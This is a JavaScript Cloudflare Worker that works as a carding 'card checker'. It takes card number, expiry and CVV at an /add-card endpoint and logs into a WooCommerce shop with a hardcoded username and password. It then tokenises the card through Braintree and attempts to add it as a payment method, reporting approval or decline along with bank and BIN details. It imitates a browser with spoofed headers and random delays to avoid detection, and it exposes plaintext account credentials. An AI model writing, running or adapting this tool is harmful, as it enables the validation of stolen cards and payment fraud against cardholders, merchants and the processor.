// worker.js
const ACCOUNT_USERNAME = 'xdiwas';
const ACCOUNT_PASSWORD = '@diwaskhatri';

const BASE    = 'https://www.kaffn8.com';
const BIN_API = 'https://bin.hex-unit.com';

const UA  = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36';
const SEC = '"Chromium";v="154", "Brave";v="154", "Not A(Brand";v="99"';

// ── helpers ────────────────────────────────────────────────────────
function H(referer, ctype, origin, ajax, extra) {
  const h = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language': 'en-US,en;q=0.5',
    'cache-control': 'max-age=0',
    'priority': 'u=0, i',
    'sec-ch-ua': SEC,
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'sec-gpc': '1',
    'upgrade-insecure-requests': '1',
    'user-agent': UA,
  };
  if (referer) h['referer'] = referer;
  if (ctype)   h['content-type'] = ctype;
  if (origin)  h['origin'] = BASE;
  if (ajax) {
    h['accept']           = '*/*';
    h['x-requested-with'] = 'XMLHttpRequest';
    h['content-type']     = 'application/x-www-form-urlencoded; charset=UTF-8';
    h['sec-fetch-dest']   = 'empty';
    h['sec-fetch-mode']   = 'cors';
    h['priority']         = 'u=1, i';
  }
  if (extra) Object.assign(h, extra);
  return h;
}

class Jar {
  constructor() { this.c = {}; }
  ingest(res) {
    let list = [];
    if (typeof res.headers.getSetCookie === 'function') {
      list = res.headers.getSetCookie();
    } else {
      const raw = res.headers.get('set-cookie');
      if (raw) list = raw.split(/,(?=\s*[A-Za-z0-9_\-]+=)/);
    }
    for (const sc of list) {
      const first = sc.split(';')[0];
      const eq = first.indexOf('=');
      if (eq > 0) {
        const k = first.slice(0, eq).trim();
        const v = first.slice(eq + 1).trim();
        this.c[k] = v;
      }
    }
  }
  header() {
    return Object.keys(this.c).map(k => `${k}=${this.c[k]}`).join('; ');
  }
}

async function jfetch(jar, url, opts) {
  opts = opts || {};
  const headers = Object.assign({}, opts.headers || {});
  const ck = jar.header();
  if (ck) headers['cookie'] = ck;
  const res = await fetch(url, Object.assign({}, opts, { headers, redirect: 'manual' }));
  jar.ingest(res);
  return res;
}

function b64ToStr(b64) {
  const bin = atob(b64);
  const bytes = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
  return new TextDecoder().decode(bytes);
}

function randHex(n) {
  const arr = new Uint8Array(n / 2);
  crypto.getRandomValues(arr);
  return Array.from(arr).map(b => b.toString(16).padStart(2, '0')).join('');
}

function delay() {
  return new Promise(r => setTimeout(r, 400 + Math.random() * 800));
}

function formEncode(pairs) {
  return pairs.map(([k, v]) => encodeURIComponent(k) + '=' + encodeURIComponent(v)).join('&');
}

function formEncodeObj(o) {
  return Object.keys(o).map(k => encodeURIComponent(k) + '=' + encodeURIComponent(o[k])).join('&');
}

function buildCard(card_info, bin_lookup) {
  const bd  = card_info.binData || {};
  const ext = bin_lookup || {};
  return {
    bin:                card_info.bin,
    last4:              card_info.last4,
    brand:              card_info.brandCode || ext.brand,
    exp:                `${card_info.expirationMonth}/${card_info.expirationYear}`,
    cardholder:         card_info.cardholderName || null,
    bank:               ext.bank,
    country:            ext.country || bd.countryOfIssuance,
    country_name:       ext.country_name,
    country_flag:       ext.country_flag,
    country_currencies: ext.country_currencies,
    level:              ext.level,
    type:               ext.type,
    issuing_bank:       bd.issuingBank,
    product_id:         bd.productId,
    prepaid:            bd.prepaid,
    commercial:         bd.commercial,
    debit:              bd.debit,
    healthcare:         bd.healthcare,
    durbin_regulated:   bd.durbinRegulated,
    payroll:            bd.payroll,
    business:           bd.business,
    consumer:           bd.consumer,
    purchase:           bd.purchase,
    corporate:          bd.corporate,
  };
}

function mk(status, success, message, reason, card, proxy) {
  const body = { success, message };
  if (reason != null) body.reason = reason;
  body.proxy = proxy || null;
  body.card  = card;
  return { status, body };
}

async function lookupBin(bin) {
  if (!bin || String(bin).length < 6) return null;
  try {
    const r = await fetch(`${BIN_API}/${bin}`, { headers: { accept: 'application/json' } });
    if (!r.ok) return null;
    const j = await r.json();
    delete j.bin_api;
    return j;
  } catch (e) { return null; }
}

// ── main flow ──────────────────────────────────────────────────────
async function run(number, exp_month, exp_year, cvv, proxy) {
  const jar = new Jar();

  const bin_lookup = await lookupBin(String(number).slice(0, 6));

  // 1. login page
  const r1 = await jfetch(jar, `${BASE}/my-account/`, { headers: H(`${BASE}/my-account/`) });
  const html1 = await r1.text();
  const lnm = html1.match(/name="woocommerce-login-nonce"\s+value="([^"]+)"/);
  if (!lnm) return mk(500, false, 'login nonce not found', null, null, proxy);
  const lnonce = lnm[1];

  await delay();

  // 2. login POST
  const r2 = await jfetch(jar, `${BASE}/my-account/`, {
    method: 'POST',
    headers: H(`${BASE}/my-account/`, 'application/x-www-form-urlencoded', true),
    body: formEncodeObj({
      username: ACCOUNT_USERNAME,
      password: ACCOUNT_PASSWORD,
      rememberme: 'forever',
      'woocommerce-login-nonce': lnonce,
      '_wp_http_referer': '/my-account/',
      login: 'Log in',
    }),
  });

  const rCheck = await jfetch(jar, `${BASE}/my-account/`, { headers: H(`${BASE}/my-account/`) });
  const checkHtml = await rCheck.text();
  const loggedIn = checkHtml.includes('customer-logout')
    || checkHtml.includes('/my-account/logout/')
    || checkHtml.includes('woocommerce-MyAccount-navigation')
    || checkHtml.includes('woocommerce-MyAccount-content');
  if (!loggedIn) return mk(401, false, 'session not established', null, null, proxy);

  await delay();

  // 3. add-payment-method page
  const r3 = await jfetch(jar, `${BASE}/my-account/add-payment-method/`, {
    headers: H(`${BASE}/my-account/payment-methods/`),
  });
  const html3 = await r3.text();
  const wnm = html3.match(/name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"/);
  if (!wnm) return mk(500, false, 'woo nonce not found', null, null, proxy);
  const woo_nonce = wnm[1];

  const ctn = html3.match(/"client_token_nonce"\s*:\s*"([^"]+)"/);
  if (!ctn) return mk(500, false, 'client_token_nonce not found', null, null, proxy);
  const client_token_nonce = ctn[1];

  await delay();

  // 4. braintree client token
  const r4 = await jfetch(jar, `${BASE}/wp-admin/admin-ajax.php`, {
    method: 'POST',
    headers: H(`${BASE}/my-account/add-payment-method/`, null, false, true),
    body: formEncodeObj({ action: 'wc_braintree_credit_card_get_client_token', nonce: client_token_nonce }),
  });
  let ajax;
  try { ajax = await r4.json(); }
  catch (e) { return mk(502, false, 'client token parse failed', null, null, proxy); }

  const raw_data = ajax.data;
  const CLIENT_TOKEN = typeof raw_data === 'string'
    ? raw_data
    : (raw_data && (raw_data.clientToken || raw_data.client_token));
  if (!CLIENT_TOKEN) return mk(502, false, 'empty client token', null, null, proxy);

  let token_data;
  try { token_data = JSON.parse(b64ToStr(CLIENT_TOKEN)); }
  catch (e) { return mk(502, false, 'client token decode failed', null, null, proxy); }
  const AUTH_FINGERPRINT = token_data.authorizationFingerprint;

  await delay();

  // 5. braintree tokenize
  const sessionId = crypto.randomUUID();
  const h5 = {
    accept: '*/*',
    'accept-language': 'en-US,en;q=0.5',
    authorization: `Bearer ${AUTH_FINGERPRINT}`,
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    origin: 'https://assets.braintreegateway.com',
    priority: 'u=1, i',
    referer: 'https://assets.braintreegateway.com/',
    'sec-ch-ua': SEC,
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'sec-gpc': '1',
    'user-agent': UA,
  };
  const query =
    'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {'
    + ' tokenizeCreditCard(input: $input) {'
    + '  token'
    + '  creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear'
    + '    binData { prepaid healthcare debit durbinRegulated commercial payroll'
    + '      issuingBank countryOfIssuance productId business consumer purchase corporate'
    + '    } } } }';

  const r5 = await fetch('https://payments.braintree-api.com/graphql', {
    method: 'POST',
    headers: h5,
    body: JSON.stringify({
      clientSdkMetadata: { source: 'client', integration: 'custom', sessionId },
      query,
      variables: {
        input: {
          creditCard: { number, expirationMonth: exp_month, expirationYear: exp_year, cvv },
          options: { validate: false },
        },
      },
      operationName: 'TokenizeCreditCard',
    }),
  });

  let r5j;
  try { r5j = await r5.json(); }
  catch (e) { return mk(502, false, 'braintree parse failed', null, null, proxy); }
  if (r5j.errors) return mk(502, false, 'braintree rejected tokenize', null, null, proxy);

  const tok_node  = r5j.data.tokenizeCreditCard;
  const token     = tok_node.token;
  const card_info = tok_node.creditCard || {};
  const card_out  = buildCard(card_info, bin_lookup);

  await delay();

  // 6. add payment method
  const correlation_id = randHex(32);
  const device_data = {
    correlation_id,
    device_session_id: correlation_id,
    fraud_merchant_id: null,
    client_metadata_id: correlation_id,
  };

  const data_6 = [
    ['payment_method', 'braintree_credit_card'],
    ['wc-braintree-credit-card-card-type', (card_info.brandCode || 'visa').toLowerCase()],
    ['wc-braintree-credit-card-3d-secure-enabled', ''],
    ['wc-braintree-credit-card-3d-secure-verified', ''],
    ['wc-braintree-credit-card-3d-secure-order-total', '0.00'],
    ['wc_braintree_credit_card_payment_nonce', token],
    ['wc_braintree_device_data', JSON.stringify(device_data)],
    ['wc-braintree-credit-card-tokenize-payment-method', 'true'],
    ['wc_braintree_paypal_payment_nonce', ''],
    ['wc-braintree-paypal-context', 'shortcode'],
    ['wc_braintree_paypal_amount', '0.00'],
    ['wc_braintree_paypal_currency', 'USD'],
    ['wc_braintree_paypal_locale', 'en_us'],
    ['wc-braintree-paypal-tokenize-payment-method', 'true'],
    ['woocommerce-add-payment-method-nonce', woo_nonce],
    ['_wp_http_referer', '/my-account/add-payment-method/'],
    ['woocommerce_add_payment_method', '1'],
  ];

  const r6 = await jfetch(jar, `${BASE}/my-account/add-payment-method/`, {
    method: 'POST',
    headers: H(`${BASE}/my-account/add-payment-method/`, 'application/x-www-form-urlencoded', true),
    body: formEncode(data_6),
  });
  const html6 = await r6.text();

  if (html6.toLowerCase().includes('payment method added')) {
    return mk(200, true, 'Payment method added successfully', null, card_out, proxy);
  }
  const m2 = html6.match(/Status code [^<."]+/) || html6.match(/Reason:\s*([^<."]+)/);
  const decline = m2 ? m2[0].trim() : 'Unknown';
  return mk(200, false, `DECLINED: ${decline}`, decline, card_out, proxy);
}

// ── worker entry ───────────────────────────────────────────────────
const CORS = {
  'access-control-allow-origin': '*',
  'access-control-allow-methods': 'GET, POST, OPTIONS',
  'access-control-allow-headers': 'content-type',
};

function jsonResp(obj, status) {
  return new Response(JSON.stringify(obj), {
    status: status || 200,
    headers: Object.assign({ 'content-type': 'application/json' }, CORS),
  });
}

export default {
  async fetch(request) {
    const url = new URL(request.url);

    if (request.method === 'OPTIONS') return new Response(null, { headers: CORS });

    if (url.pathname === '/health') {
      return jsonResp({ success: true, message: 'ok', ts: Math.floor(Date.now() / 1000) });
    }

    if (url.pathname === '/add-card') {
      let body = {};
      if (request.method === 'POST') {
        try { body = await request.json(); } catch (e) {}
      } else {
        body = Object.fromEntries(url.searchParams);
      }

      const number = body.number || body.card;
      const exp_m  = body.exp_month || body.month;
      const exp_y  = body.exp_year  || body.year;
      const cvv    = body.cvv;
      const proxy  = body.proxy || null;

      const missing = [];
      if (!number) missing.push('number');
      if (!exp_m)  missing.push('exp_month');
      if (!exp_y)  missing.push('exp_year');
      if (!cvv)    missing.push('cvv');
      if (missing.length) {
        return jsonResp({ success: false, message: `missing: ${missing.join(', ')}` }, 400);
      }

      try {
        const result = await run(
          String(number).replace(/[\s-]/g, ''),
          String(exp_m).padStart(2, '0'),
          String(exp_y),
          String(cvv),
          proxy
        );
        return jsonResp(result.body, result.status);
      } catch (e) {
        return jsonResp({ success: false, message: String(e), proxy }, 502);
      }
    }

    return new Response('not found', { status: 404, headers: CORS });
  },
};